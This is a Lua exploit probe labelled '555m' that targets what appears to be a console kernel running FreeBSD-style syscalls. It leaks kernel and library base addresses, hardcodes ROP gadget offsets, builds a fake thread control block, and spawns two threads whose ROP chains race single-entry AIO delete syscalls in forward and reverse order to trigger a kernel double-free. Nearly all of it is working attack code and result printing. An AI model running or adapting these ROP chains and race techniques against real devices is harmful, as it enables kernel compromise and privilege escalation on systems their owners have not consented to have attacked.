-- CRASH_CLASS: HIGH
-- PROBE 555m: single-entry delete race (batch=1 × 32 per child)
--
-- 555l proved aio_multi_delete holds a BATCH-LEVEL lock: one thread
-- processes all entries, the other waits. No per-entry race possible.
--
-- This probe: each child calls delete(id, 1, &err) 32 SEPARATE times.
-- Each syscall = separate lock acquisition/release.
-- Forward vs reverse ordering → interleaving should appear if lock is per-call.
-- Even without double-free, mixed results prove per-entry processing.
-- If A=32 still → the entries are fully freed before B can see them.

print("=== PROBE 555m: SINGLE DELETE RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", N(v))
end

local Z = uint64(0)
local sc6   = mk(6)
local sc20  = mk(20)
local sc135 = mk(135)
local sc331 = mk(331)
local sc455 = mk(455)
local sc477 = mk(477)
local sc669 = mk(669)
local sc664 = mk(664)
local sc666 = mk(666)

local pid = N(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))

zero(info, 0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax   = eb + uint64(0x992)
local pop_rdi   = eb + uint64(0xC9DFE)
local pop_rsi   = eb + uint64(0xD77D)
local pop_rdx   = eb + uint64(0x3B02D7)
local mov_m_rax = eb + uint64(0x92C67)
local bare_ret  = eb + uint64(0x42)
local fn_addr   = lk + uint64(0xB57)

local BATCH = 32

-- Shared memory
local ok_sh, shared = pcall(function()
    return sc477(Z, uint64(0x8000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local sn = N(shared)
print("shared=" .. q(shared))

-- Layout:
-- +0x000: done_A, done_B
-- +0x010: ids_fwd (32 dwords) — each is a single-entry "array" for batch=1
-- +0x100: ids_rev (32 dwords) — same IDs, reverse order
-- +0x200: errs_A (32 dwords) — one per single-entry delete
-- +0x300: errs_B (32 dwords)
-- +0x400: rbuf
local done_A   = sn + 0x000
local done_B   = sn + 0x004
local ids_fwd  = sn + 0x010
local ids_rev  = sn + 0x100
local errs_A   = sn + 0x200
local errs_B   = sn + 0x300
local rbuf_A   = sn + 0x400
local rbuf_B   = sn + 0x404

-- Fake TCB
local ok_tcb, tcb_page = pcall(function()
    return sc477(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
for i = 0, 0x100, 8 do wq(tcb_page + i, tcb_page) end
local tcb_ptr_buf = memory.alloc(8)
wq(tcb_ptr_buf, tcb_page)

-- Stacks (need large — 32 individual deletes per chain)
local ok_sa, stack_A = pcall(function()
    return sc477(Z, uint64(0x400000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local ok_sb, stack_B = pcall(function()
    return sc477(Z, uint64(0x400000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local rsp_A = N(stack_A) + 0x200000 - 8
local rsp_B = N(stack_B) + 0x200000 - 8

-- Build chain with 32 individual delete(id, 1, &err) calls
local function build_single_chain(rsp_val, barrier_fd, rbuf_ptr, ids_base, errs_base, done_ptr, marker)
    local pos = 0
    local function emit(v) wq(uint64(rsp_val + pos), v); pos = pos + 8 end

    -- sysarch
    emit(pop_rdi); emit(uint64(129))
    emit(pop_rsi); emit(uint64(N(tcb_ptr_buf)))
    emit(pop_rax); emit(uint64(165))
    emit(fn_addr)

    -- read barrier
    emit(pop_rdi); emit(uint64(barrier_fd))
    emit(pop_rsi); emit(uint64(rbuf_ptr))
    emit(pop_rdx); emit(uint64(1))
    emit(pop_rax); emit(uint64(3))
    emit(fn_addr)

    -- 32 individual delete calls
    for i = 0, BATCH - 1 do
        emit(pop_rdi); emit(uint64(ids_base + i * 4))
        emit(pop_rsi); emit(uint64(1))  -- batch=1
        emit(pop_rdx); emit(uint64(errs_base + i * 4))
        emit(pop_rax); emit(uint64(662))
        emit(fn_addr)
    end

    -- done
    emit(pop_rax); emit(uint64(marker))
    emit(pop_rdi); emit(uint64(done_ptr))
    emit(mov_m_rax)

    -- thr_exit
    emit(pop_rdi); emit(Z)
    emit(pop_rax); emit(uint64(431))
    emit(fn_addr)

    return pos
end

local tp_A = memory.alloc(0x40); zero(tp_A, 0x40)
wq(tp_A, bare_ret); wq(tp_A + 0x10, stack_A); wq(tp_A + 0x18, uint64(0x200008))

local tp_B = memory.alloc(0x40); zero(tp_B, 0x40)
wq(tp_B, bare_ret); wq(tp_B + 0x10, stack_B); wq(tp_B + 0x18, uint64(0x200008))

local sv      = memory.alloc(16)
local bar_sv  = memory.alloc(16)
local scratch = memory.alloc(0x1000)
local reqs    = memory.alloc(BATCH * 0x28 + 16)
local ids_tmp = memory.alloc(BATCH * 4 + 16)
local cst     = memory.alloc(BATCH * 4 + 16)
local poll_st = memory.alloc(BATCH * 4 + 16)

local ROUNDS = 300

print(string.format("Racing %d rounds, 32×single delete per child (fwd vs rev)\n", ROUNDS))

local total_wins = 0
local a_clean = 0
local b_clean = 0
local mixed = 0
local timeouts = 0
local first_mixed = nil

for round = 1, ROUNDS do
    local fds_r = {}
    local fds_w = {}
    local ok_sp = true
    for i = 1, BATCH do
        local ok, v = pcall(function()
            return sc135(uint64(1), uint64(1), Z, uint64(N(sv)))
        end)
        if ok and N(v) >= 0 then
            fds_r[i] = rd(sv)
            fds_w[i] = rd(sv + 4)
        else
            ok_sp = false; break
        end
    end

    if ok_sp then
        for i = 0, BATCH - 1 do
            local base = reqs + i * 0x28
            wq(base + 0x00, Z)
            wq(base + 0x08, uint64(0x1000))
            wq(base + 0x10, uint64(N(scratch)))
            wq(base + 0x18, Z)
            wd(base + 0x20, fds_r[i + 1])
            wd(base + 0x24, 0)
        end
        for i = 0, BATCH - 1 do wd(ids_tmp + i * 4, 0) end
        pcall(function()
            sc669(uint64(0x1001), uint64(N(reqs)), uint64(BATCH),
                uint64(3), uint64(N(ids_tmp)))
        end)
        pcall(function()
            sc666(uint64(N(ids_tmp)), uint64(BATCH), uint64(N(cst)))
        end)
        for i = 1, BATCH do
            pcall(function() sc6(uint64(fds_w[i])) end)
        end

        local all_term = false
        for try = 1, 100 do
            pcall(function()
                sc664(uint64(N(ids_tmp)), uint64(BATCH), uint64(N(poll_st)))
            end)
            all_term = true
            for i = 0, BATCH - 1 do
                local s = rd(poll_st + i * 4)
                if not s or s < 3 then all_term = false; break end
            end
            if all_term then break end
        end

        if all_term then
            local ok_b, rv_b = pcall(function()
                return sc135(uint64(1), uint64(1), Z, uint64(N(bar_sv)))
            end)
            local bar_rd = rd(bar_sv) or -1
            local bar_wr = rd(bar_sv + 4) or -1

            if bar_rd >= 0 then
                for i = 0, BATCH - 1 do
                    local id_val = rd(ids_tmp + i * 4) or 0
                    wd(ids_fwd + i * 4, id_val)
                    wd(ids_rev + (BATCH - 1 - i) * 4, id_val)
                    wd(errs_A + i * 4, 0x77777777)
                    wd(errs_B + i * 4, 0x77777777)
                end
                wd(done_A, 0)
                wd(done_B, 0)

                build_single_chain(rsp_A, bar_rd, rbuf_A, ids_fwd, errs_A, done_A, 0xAAAA)
                build_single_chain(rsp_B, bar_rd, rbuf_B, ids_rev, errs_B, done_B, 0xBBBB)

                pcall(function() sc455(uint64(N(tp_A)), uint64(0x38)) end)
                pcall(function() sc455(uint64(N(tp_B)), uint64(0x38)) end)

                for y = 1, 5 do pcall(function() sc331() end) end

                pcall(function() sc6(uint64(bar_wr)) end)

                for y = 1, 40 do
                    pcall(function() sc331() end)
                    if (rd(done_A) or 0) ~= 0 and (rd(done_B) or 0) ~= 0 then break end
                end

                pcall(function() sc6(uint64(bar_rd)) end)

                local da_ok = (rd(done_A) or 0) == 0xAAAA
                local db_ok = (rd(done_B) or 0) == 0xBBBB
                if not da_ok or not db_ok then timeouts = timeouts + 1 end

                -- Count successes per child
                local a_ok = 0
                local b_ok = 0
                for i = 0, BATCH - 1 do
                    if (rd(errs_A + i * 4) or 0x77777777) == 0 then a_ok = a_ok + 1 end
                    if (rd(errs_B + i * 4) or 0x77777777) == 0 then b_ok = b_ok + 1 end
                end

                -- Double-free: A's errs_A[i] and B's errs_B[31-i] refer to same AIO id
                local win = 0
                for i = 0, BATCH - 1 do
                    local ea = rd(errs_A + i * 4) or 0x77777777
                    local eb_v = rd(errs_B + (BATCH - 1 - i) * 4) or 0x77777777
                    if ea == 0 and eb_v == 0 then win = win + 1 end
                end
                if win > 0 then
                    total_wins = total_wins + win
                    print(string.format("R%d: *** DOUBLE-FREE %d ***", round, win))
                end

                if a_ok == BATCH and b_ok == 0 then a_clean = a_clean + 1
                elseif b_ok == BATCH and a_ok == 0 then b_clean = b_clean + 1
                elseif a_ok > 0 and b_ok > 0 then
                    mixed = mixed + 1
                    if not first_mixed then
                        first_mixed = round
                        print(string.format("R%d: MIXED! A=%d B=%d (first interleave)", round, a_ok, b_ok))
                        for i = 0, 7 do
                            print(string.format("  A[%d]=0x%X B[%d]=0x%X",
                                i, rd(errs_A + i * 4) or 0, i, rd(errs_B + i * 4) or 0))
                        end
                    end
                end

                if round % 50 == 0 then
                    print(string.format("  r=%d w=%d A=%d B=%d mx=%d to=%d",
                        round, total_wins, a_clean, b_clean, mixed, timeouts))
                end
            end
        end

        for i = 1, BATCH do
            pcall(function() sc6(uint64(fds_r[i])) end)
        end
    end
end

print("")
local pid2 = N(sc20())
print(string.format("TOTAL: r=%d wins=%d A=%d B=%d mixed=%d to=%d pid=%d%s",
    ROUNDS, total_wins, a_clean, b_clean, mixed, timeouts, pid2,
    pid2 == pid and " OK" or " CHANGED"))

if total_wins > 0 then
    print(">>> DOUBLE-FREE CONFIRMED <<<")
elseif mixed > 0 then
    print("INTERLEAVING confirmed — per-entry lock model. Race window just too narrow.")
    print("Need more rounds, or different race pattern.")
else
    print("no interleaving — entries are fully freed within the single-entry lock hold")
    print("the double-free vuln may require different conditions or be patched on 14.10")
end
print("=== 555m DONE ===")
